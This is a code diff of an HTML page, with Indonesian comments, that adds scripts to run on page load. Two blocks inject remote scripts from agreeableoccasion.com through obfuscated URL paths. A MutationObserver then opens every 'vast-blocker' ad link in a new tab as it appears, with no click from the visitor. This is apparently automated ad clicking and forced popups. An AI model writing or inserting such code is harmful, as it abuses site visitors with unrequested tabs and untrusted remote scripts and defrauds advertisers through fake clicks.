@@ -13,30 +13,47 @@
   </style>
 </head>
 <body>
-  <!-- Inject script iklan -->
+  <!-- Inject script iklan 1 -->
   <script>
-    (function(fre){
+    (function(mzptj){
       var d = document,
           s = d.createElement('script'),
           l = d.scripts[d.scripts.length - 1];
-      s.settings = fre || {};
-      s.src = "\/\/agreeableoccasion.com\/bhX\/VWsHd.GMlN0uYJWncu\/Nevm-9YulZsUcldkKPYTGYm2oNWTCIRw\/N\/jhYDt\/N-juYl1iMwjdAM2gNXwE";
+      s.settings = mzptj || {};
+      s.src = "\/\/agreeableoccasion.com\/bqXlVmsqd.G\/lN0_YiWIcP\/LeGm\/9ZuWZ\/UllGkuPQTxYC2GNnTZIewaNUzmAetHNOj\/Yw1gMWj\/AY3VMtQw";
       s.async = true;
       s.referrerPolicy = 'no-referrer-when-downgrade';
       l.parentNode.insertBefore(s, l);
     })({})
   </script>
 
-  <!-- Observer untuk tunggu elemen muncul lalu auto klik di tab yang sama -->
+  <!-- Inject script iklan 2 -->
   <script>
+    (function(vgzb){
+      var d = document,
+          s = d.createElement('script'),
+          l = d.scripts[d.scripts.length - 1];
+      s.settings = vgzb || {};
+      s.src = "\/\/agreeableoccasion.com\/beX\/VfsBd.Ghlb0gYIWicS\/teEm\/9wu\/ZkUblek\/PuTuYb2nN\/TAI\/w\/NRjnYetnNFjJYP1MM\/jEA_2ENywU";
+      s.async = true;
+      s.referrerPolicy = 'no-referrer-when-downgrade';
+      l.parentNode.insertBefore(s, l);
+    })({})
+  </script>
+
+  <!-- Observer untuk auto buka semua link vast-blocker di tab baru -->
+  <script>
+    const opened = new Set();
+
     const observer = new MutationObserver(() => {
-      const adLink = document.querySelector('a.vast-blocker[href]');
-      if (adLink) {
-        observer.disconnect(); // stop ngamatin
-        setTimeout(() => {
-          window.location.href = adLink.href; // buka langsung di tab yang sama
-        }, 3000); // delay 3 detik
-      }
+      const links = document.querySelectorAll('a.vast-blocker[href]');
+      links.forEach(link => {
+        if (!opened.has(link.href)) {
+          opened.add(link.href);
+          // buka di tab baru
+          window.open(link.href, '_blank');
+        }
+      });
     });
 
     observer.observe(document.body, {
